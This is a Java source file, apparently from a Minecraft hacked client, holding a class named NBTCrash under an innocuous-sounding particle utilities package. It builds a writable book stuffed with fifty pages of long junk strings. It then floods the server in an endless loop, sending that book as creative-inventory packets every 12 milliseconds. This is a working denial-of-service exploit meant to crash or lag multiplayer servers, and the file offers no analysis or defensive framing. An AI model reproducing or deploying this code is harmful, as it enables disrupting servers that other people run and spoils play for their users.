package net.minecraft.client.particle.chroma.utils;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class NBTCrash extends Thread {
   public void run() {
      try {
         ItemStack bookObj = new ItemStack(Items.writable_book);
         NBTTagList list = new NBTTagList();
         NBTTagCompound tag = new NBTTagCompound();
         String author = Minecraft.getMinecraft().getSession().getUsername();
         String title = "Title";
         String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

         for(int i = 0; i < 50; ++i) {
            NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
         }

         tag.setString("author", author);
         tag.setString("title", title);
         tag.setTag("pages", list);
         bookObj.setTagInfo("pages", list);
         bookObj.setTagCompound(tag);

         while(true) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, bookObj));
            Thread.sleep(12L);
         }
      } catch (Exception var10) {
         var10.printStackTrace();
      }
   }
}
